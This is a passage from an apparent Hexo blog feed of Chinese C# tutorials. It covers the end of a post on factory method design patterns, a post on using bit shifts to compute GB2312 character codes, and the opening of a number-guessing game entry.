property">#<span class="token directive keyword">region</span> 实例化商品的工厂</span>    <span class="token comment" spellcheck="true">/// &lt;summary></span>    <span class="token comment" spellcheck="true">/// 工厂类</span>    <span class="token comment" spellcheck="true">/// &lt;/summary></span>    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">PetFactory</span>    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// 工厂类中创建对象的方法</span>        <span class="token comment" spellcheck="true">/// &lt;/summary></span>        <span class="token comment" spellcheck="true">/// &lt;param name="petType">用来创建指定对象的参数&lt;/param></span>        <span class="token comment" spellcheck="true">/// &lt;returns>返回创建的Pet对象&lt;/returns></span>        <span class="token keyword">public</span> Pet <span class="token function">getPet</span><span class="token punctuation">(</span><span class="token keyword">string</span> petType<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Pet pet <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"Bow"</span><span class="token punctuation">.</span><span class="token function">Equals</span><span class="token punctuation">(</span>petType<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                pet <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Dog</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"Meaw"</span><span class="token punctuation">.</span><span class="token function">Equals</span><span class="token punctuation">(</span>petType<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                pet <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Cat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">return</span> pet<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span></code></pre><p><strong>测试类</strong>：</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token preprocessor property">#<span class="token directive keyword">region</span> 测试类</span>    <span class="token keyword">class</span> <span class="token class-name">SimpleFactoryMethod</span>    <span class="token punctuation">{</span>        <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Main</span><span class="token punctuation">(</span><span class="token keyword">string</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//1.实例化工厂对象</span>            PetFactory petFactory <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FactoryMethod_Demo1<span class="token punctuation">.</span>PetFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//2.使用工厂对象创建指定的商品实例</span>            Pet pet <span class="token operator">=</span> petFactory<span class="token punctuation">.</span><span class="token function">getPet</span><span class="token punctuation">(</span><span class="token string">"Bow"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//3.使用商品实例</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span>pet<span class="token punctuation">.</span><span class="token function">petSound</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Console<span class="token punctuation">.</span><span class="token function">ReadKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span></code></pre><h2 id="多工厂方法模式"><a href="#多工厂方法模式" class="headerlink" title="多工厂方法模式"></a><strong>多工厂方法模式</strong></h2><p>​        在多个工厂方法模式中，工厂类中每一个商品都有与其相对应的创建实例对象的方法。</p><p><strong>多工厂方法模式UML类图</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/GOFDesignPattern/工厂方法模式/多方法工厂模式类图.png" alt="多方法工厂模式类图"></center><p><strong>抽象产品角色</strong>：</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token preprocessor property">#<span class="token directive keyword">region</span> 基类--接口形式展示</span>    <span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Pet</span>    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//商品的行为（方法）   --只有方法体</span>        <span class="token keyword">string</span> <span class="token function">petSound</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span></code></pre><p><strong>具体产品角色</strong>：</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token preprocessor property">#<span class="token directive keyword">region</span> 具体商品类对基类的继承与扩展</span>    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Dog</span> <span class="token punctuation">:</span> Pet    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 对接口中方法的实现</span>        <span class="token keyword">public</span> <span class="token keyword">string</span> <span class="token function">petSound</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token string">"Bow Bow..."</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// 具体商品类的扩展</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> color<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">SetColor</span><span class="token punctuation">(</span><span class="token keyword">string</span> color<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>color <span class="token operator">=</span> color<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Cat</span> <span class="token punctuation">:</span> Pet    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">string</span> <span class="token function">petSound</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token string">"Meaw Meaw..."</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span></code></pre><p><strong>工厂角色</strong>：</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token preprocessor property">#<span class="token directive keyword">region</span> 工厂角色</span>    <span class="token comment" spellcheck="true">/// &lt;summary></span>    <span class="token comment" spellcheck="true">/// 创建Pet的工厂类</span>    <span class="token comment" spellcheck="true">/// &lt;/summary></span>    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MultiplePetFactory</span>    <span class="token punctuation">{</span>        Pet pet <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> Pet <span class="token function">CreateDog</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            pet <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Dog</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> pet<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> Pet <span class="token function">CreateCat</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            pet <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Cat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> pet<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span></code></pre><p><strong>测试类</strong>：</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token preprocessor property">#<span class="token directive keyword">region</span> 测试类</span>    <span class="token keyword">class</span> <span class="token class-name">MultipleFactoryMethod</span>    <span class="token punctuation">{</span>        <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Main</span><span class="token punctuation">(</span><span class="token keyword">string</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//1、创建工厂类对象</span>            MultiplePetFactory petFactory <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MultiplePetFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//2、使用工厂类对象得到商品对象</span>            Pet pet <span class="token operator">=</span> petFactory<span class="token punctuation">.</span><span class="token function">CreateDog</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//3、对商品对象进行操作</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span>pet<span class="token punctuation">.</span><span class="token function">petSound</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Console<span class="token punctuation">.</span><span class="token function">ReadKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span></code></pre><h2 id="静态工厂方法模式"><a href="#静态工厂方法模式" class="headerlink" title="静态工厂方法模式"></a><strong>静态工厂方法模式</strong></h2><p>​        在静态工厂方法模式中，工厂类中每一个商品都有与其相对应的创建实例对象的静态方法</p><p><strong>静态工厂方法模式</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/GOFDesignPattern/工厂方法模式/静态方法工厂模式类图.png" alt="静态方法工厂模式类图"></center><p><strong>抽象产品角色</strong>：</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token preprocessor property">#<span class="token directive keyword">region</span> 基类--接口形式展示</span>    <span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Pet</span>    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//商品的行为（方法）   --只有方法体</span>        <span class="token keyword">string</span> <span class="token function">petSound</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span></code></pre><p><strong>具体产品角色</strong>：</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token preprocessor property">#<span class="token directive keyword">region</span> 具体商品类对基类的继承与扩展</span>    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Dog</span> <span class="token punctuation">:</span> Pet    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 对接口中方法的实现</span>        <span class="token keyword">public</span> <span class="token keyword">string</span> <span class="token function">petSound</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token string">"Bow Bow..."</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// 具体商品类的扩展</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> color<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">SetColor</span><span class="token punctuation">(</span><span class="token keyword">string</span> color<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>color <span class="token operator">=</span> color<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Cat</span> <span class="token punctuation">:</span> Pet    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">string</span> <span class="token function">petSound</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token string">"Meaw Meaw..."</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span></code></pre><p><strong>工厂角色</strong>：</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token preprocessor property">#<span class="token directive keyword">region</span> 工厂角色</span>    <span class="token comment" spellcheck="true">/// &lt;summary></span>    <span class="token comment" spellcheck="true">/// 静态工厂</span>    <span class="token comment" spellcheck="true">/// &lt;/summary></span>    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">StaticMultiPetFactory</span>    <span class="token punctuation">{</span>        <span class="token keyword">static</span> Pet pet <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> Pet <span class="token function">CreateDog</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            pet <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Dog</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> pet<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> Pet <span class="token function">CreateCat</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            pet <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Cat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> pet<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span></code></pre><p><strong>测试类</strong>：</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token preprocessor property">#<span class="token directive keyword">region</span> 测试类</span>    <span class="token keyword">class</span> <span class="token class-name">StaticMultiFactoryMethod</span>    <span class="token punctuation">{</span>        <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Main</span><span class="token punctuation">(</span><span class="token keyword">string</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//1、得到商品对象</span>            Pet pet <span class="token operator">=</span> StaticMultiPetFactory<span class="token punctuation">.</span><span class="token function">CreateDog</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//2、使用商品对象</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span>pet<span class="token punctuation">.</span><span class="token function">petSound</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Console<span class="token punctuation">.</span><span class="token function">ReadKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span></code></pre><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h2 id="三种工厂方法模式的比较"><a href="#三种工厂方法模式的比较" class="headerlink" title="三种工厂方法模式的比较"></a>三种工厂方法模式的比较</h2><p><strong>相同点</strong>：</p><ul><li>都存在三种角色：(工厂角色、抽象产品角色(抽象类或接口)、具体产品角色)；</li><li>主要是<strong>依靠继承关系</strong>来实现的。</li></ul><p><strong>不同点</strong>：</p><ul><li>普通工厂模式：<strong>工厂</strong>类需要先<strong>实例化</strong>；工厂类中只有一个生产商品的方法且该方法必须指定的相应的<strong>参数</strong>之后才能进行生产；</li><li>多个工厂方法模式：<strong>工厂</strong>类需要先<strong>实例化</strong>；<strong>每一个实体类</strong>在工厂类中<strong>都有一个</strong>生产其对应<strong>实例的方法</strong>，无需额外的参数进行传递；</li><li>静态工厂方法模式：<strong>工厂</strong>类可以<strong>直接使用</strong>；<strong>每一个实体类</strong>在工厂类中<strong>都有一个</strong>生产其对应<strong>实例的方法</strong>，无需额外的参数进行传递。</li></ul><h2 id="优点与缺点"><a href="#优点与缺点" class="headerlink" title="优点与缺点"></a>优点与缺点</h2><p><strong>简单工厂模式</strong>：</p><ul><li>优点：封装对象的创建过程，使之不可见</li><li>缺点:使用工厂类创建对象时，需要传入一个参数才能进行对象的创建   –&gt;多个工厂方法模式(不用传入参数)</li></ul><p><strong>多工厂方法模式</strong>：</p><ul><li>优点：封装对象的创建过程，使之不可见；不用传入参数类创建</li><li>缺点：工厂负荷变大</li></ul><p><strong>静态工厂方法模式</strong>：</p><ul><li>优点：封装对象的创建过程，使之不可见；不用传入参数类创建；不用实例化工厂对象</li><li>缺点：一经启动工厂类中的静态方法就就占据一定量的内存空间       –（慎用）</li></ul><p><strong>致命缺点</strong>：</p><ul><li><font color="red">创建的商品对象<strong>无法访问</strong>到子类对其的<strong>扩展</strong>（使用了多态）。</font></li></ul><h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><ul><li>当需要创建一个类，而在编程时不能确定这个类的类型时（需要运行时确定）</li><li>当一个类希望由其子类来指定所创建对象的具体类型时</li><li>当我们想要定位被创建类，并获取相关消息时</li></ul><h2 id="用例"><a href="#用例" class="headerlink" title="用例"></a>用例</h2><ul><li>日志记录功能（文件日志记录、数据库日志记录、控制台日志记录等）</li></ul>]]></content>
      
      
      <categories>
          
          <category> 设计模式 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C# </tag>
            
            <tag> 设计模式 </tag>
            
            <tag> 工厂方法模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSharp巧用移位运算符获取汉字编码值</title>
      <link href="/2020/08/22/csharp-qiao-yong-yi-wei-yun-suan-fu-huo-qu-han-zi-bian-ma-zhi/"/>
      <url>/2020/08/22/csharp-qiao-yong-yi-wei-yun-suan-fu-huo-qu-han-zi-bian-ma-zhi/</url>
      
        <content type="html"><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><h2 id="移位运算符"><a href="#移位运算符" class="headerlink" title="移位运算符"></a>移位运算符</h2><ul><li><p>移位运算符在程序设计中，是<strong>位操作运算符</strong>的一种</p></li><li><p>移位运算符分为<strong>左移位运算符</strong>“&lt;&lt;”和<strong>右移位运算符</strong>“&gt;&gt;”，形如：<strong>X &lt;&lt; N</strong> 或 <strong>X &gt;&gt; N</strong></p></li><li><p>在C#中<strong>X</strong>可以是：int、uint、long、ulong、byte、sbyte、short、ushort，其中<strong>byte、sbyte、short、ushort</strong>类型的值在进行移位操作后的类型将<strong>自动转换成int类型</strong></p></li><li><p>其他类型数据的移位运算其本质还是对<strong>二进制的移位运算</strong></p></li><li><p><span style="color:red">二进制每次向左移1位就相当于乘以2，每次向右移1位就相当于除以2</span></p></li><li><p>举例如下：</p><blockquote><p>问题：</p><ul><li>3(O) &lt;&lt; 2</li></ul><p>计算过程：</p><ol><li>3(O)转换为二进制为:<strong>0011</strong></li><li>二进制数值各个位整体左移两位（<span style="color:red">左端溢出丢弃，右端补”0”</span>）后得到：<strong>1100</strong></li><li>再将移位后的二进制数值转换为十进制数值为：12(O)</li><li>也即：<span style="color:red">3 &lt;&lt; 2 = 12</span></li></ol></blockquote></li></ul><h2 id="汉字编码"><a href="#汉字编码" class="headerlink" title="汉字编码"></a>汉字编码</h2><p>​        汉字编码(Chinese character encoding)是为汉字设计的一种便于输入计算机的代码。</p><h3 id="编码分类"><a href="#编码分类" class="headerlink" title="编码分类"></a>编码分类</h3><p>​        计算机中汉字的表示也是用二进制，根据<strong>应用目的</strong>的不同，汉字编码分为<strong>外码</strong>、<strong>交换码</strong>、<strong>机内码</strong>和<strong>字形码</strong>。</p><h4 id="外码-输入码"><a href="#外码-输入码" class="headerlink" title="外码(输入码)"></a>外码(输入码)</h4><p>​        外码也叫输入码，是用来将汉字输入到计算机中的一组键盘符号。常用的输入码有拼音码、五笔字型码、区位码、电报码等</p><p><strong>特点</strong>：</p><ul><li>编码规则简单</li><li>易学好记</li><li>操作方便</li><li>重码率低</li><li>输入速度快</li></ul><h4 id="交换码-国际码"><a href="#交换码-国际码" class="headerlink" title="交换码(国际码)"></a>交换码(国际码)</h4><p>​        计算机内部处理的信息都是<strong>二进制代码</strong>表示的，汉字也不例外。而二进制代码使用起来很不方便，于是需要采用<strong>信息交换码</strong>。GB2312即为国际码。</p><ul><li><strong>GB2312编码</strong>：1981年5月1日发布的简体中文汉字编码国家标准。GB2312对汉字采用双字节编码，收录7445个图形字符，其中包括6763个汉字。</li><li><strong>BIG5编码</strong>：台湾地区繁体中文标准字符集，采用双字节编码，共收录13053个中文字，1984年实施。</li><li><strong>GBK编码</strong>：1995年12月发布的汉字编码国家标准，是对GB2312编码的扩充，对汉字采用双字节编码。GBK字符集共收录21003个汉字，包含国家标准GB13000-1中的全部中日韩汉字，和BIG5编码中的所有汉字。</li><li><strong>GB18030编码</strong>：2000年3月17日发布的汉字编码国家标准，是对GBK编码的扩充，覆盖中文、日文、朝鲜语和中国少数民族文字，其中收录27484个汉字。GB18030字符集采用单字节、双字节和四字节三种方式对字符编码。兼容GBK和GB2312字符集。</li><li><strong>Unicode编码</strong>：国际标准字符集，它将世界各种语言的每个字符定义一个唯一的编码，以满足跨语言、跨平台的文本信息转换。</li></ul><h4 id="机内码"><a href="#机内码" class="headerlink" title="机内码"></a>机内码</h4><p>​        根据国际码的规定，每个汉字都有确定的<strong>二进制代码</strong>，在微机内部汉字代码都用机内码，在键盘上记录汉字代码也使用机内码。</p><h4 id="字形码"><a href="#字形码" class="headerlink" title="字形码"></a>字形码</h4><p>​        字形码是汉字的<strong>输出码</strong>，输出汉字时都采用<strong>图形方式</strong>，无论汉字的笔画多少，每个汉字都可以卸载同样大小的<strong>方块</strong>中。通常用16×16点阵来显示汉字。</p><h4 id="地址码"><a href="#地址码" class="headerlink" title="地址码"></a>地址码</h4><p>​        汉字地址码是指汉字库中存<strong>储汉字字形信息的逻辑地址码</strong>。它与汉字机内码有着简单的对应关系，以简单内码到地址码的转换。</p><h3 id="汉字编码之间的关系"><a href="#汉字编码之间的关系" class="headerlink" title="汉字编码之间的关系"></a>汉字编码之间的关系</h3><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/CSharp/CSharp巧用移位运算符获取汉字编码值/汉字编码之间的关系.png" alt="汉字编码之间的关系"></center><h1 id="操作环境"><a href="#操作环境" class="headerlink" title="操作环境"></a>操作环境</h1><p><strong>编程环境</strong>：</p><ul><li>VS2017</li><li>.Net Framework 4.5</li></ul><p><strong>运行环境</strong>：</p><ul><li>Win10</li></ul><h1 id="设计实现"><a href="#设计实现" class="headerlink" title="设计实现"></a>设计实现</h1><p><strong>界面设计</strong>:</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/CSharp/CSharp巧用移位运算符获取汉字编码值/界面.png" alt="界面"></center><p><strong>代码设计</strong>:</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">using</span> System<span class="token punctuation">;</span><span class="token keyword">using</span> System<span class="token punctuation">.</span>Text<span class="token punctuation">;</span><span class="token keyword">using</span> System<span class="token punctuation">.</span>Windows<span class="token punctuation">.</span>Forms<span class="token punctuation">;</span><span class="token keyword">namespace</span> GetCode<span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">partial</span> <span class="token keyword">class</span> <span class="token class-name">Form1</span> <span class="token punctuation">:</span> Form    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token function">Form1</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token function">InitializeComponent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">btn_Get_Click</span><span class="token punctuation">(</span><span class="token keyword">object</span> sender<span class="token punctuation">,</span> EventArgs e<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">try</span>            <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">//获得一个汉字字符</span>                <span class="token keyword">char</span> ch <span class="token operator">=</span> txt_ch<span class="token punctuation">.</span>Text<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">//使用gb2312编码方式获得字节序列</span>                <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> gb2312_bt <span class="token operator">=</span> Encoding<span class="token punctuation">.</span><span class="token function">GetEncoding</span><span class="token punctuation">(</span><span class="token string">"gb2312"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">GetBytes</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span> ch <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">//将字节序列的第一个字节向左移8位</span>                <span class="token keyword">int</span> n <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>gb2312_bt<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">//第一个字节移8位后与第二个字节相加得到汉字编码</span>                n <span class="token operator">+</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>gb2312_bt<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">//显示汉字编码(十六进制)</span>                txt_Num<span class="token punctuation">.</span>Text <span class="token operator">=</span> Convert<span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">//异常提示信息</span>                MessageBox<span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span><span class="token string">"请输入汉字字符！"</span><span class="token punctuation">,</span> <span class="token string">"出现错误！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h1 id="实现结果"><a href="#实现结果" class="headerlink" title="实现结果"></a>实现结果</h1><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/CSharp/CSharp巧用移位运算符获取汉字编码值/结果.png" alt="结果"></center><h2 id="原理解析"><a href="#原理解析" class="headerlink" title="原理解析"></a>原理解析</h2><ul><li>char ch = txt_ch.Text[0];<font color="blue">//ch变量存储“位”的Unicode编码</font>&gt;</li><li>byte[] gb2312_bt = Encoding.GetEncoding(“gb2312”).GetBytes(new Char[] { ch });<font color="blue">//gb2312_bt变量数组中存储由ch编码得到的GB2312字节</font></li><li>int n = (int)gb2312_bt[0] &lt;&lt; 8;<font color="blue"> //将字节左移八位(一个字节)</font></li><li>n += (int)gb2312_bt[1];<font color="blue">//两个数值相加得到“位”的GB2312编码(十进制)</font></li><li>txt_Num.Text = Convert.ToString(n, 16);<font color="blue">//编码转十六进制并显示</font></li></ul><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p><strong>参考链接</strong>：</p><ul><li><a href="https://baike.baidu.com/item/汉字编码/7123465?fr=aladdin" target="_blank" rel="noopener">汉字编码(百度百科)</a></li><li><a href="https://www.qqxiuzi.cn/bianma/zifuji.php" target="_blank" rel="noopener">千千秀字(汉字字符集编码查询)</a></li></ul><p><strong>有关字体编码/查询/加解密网站推荐</strong>：</p><p><a href="https://www.qqxiuzi.cn/daohang.htm" target="_blank" rel="noopener">千千秀字</a></p>]]></content>
      
      
      <categories>
          
          <category> C# </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C# </tag>
            
            <tag> 编码 </tag>
            
            <tag> 程序实现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSharp多线程猜数字游戏</title>
      <link href="/2020/08/22/csharp-duo-xian-cheng-cai-shu-zi-you-xi/"/>
      <url>/2020/08/22/csharp-duo-xian-cheng-cai-shu-zi-you-xi/</url>
      
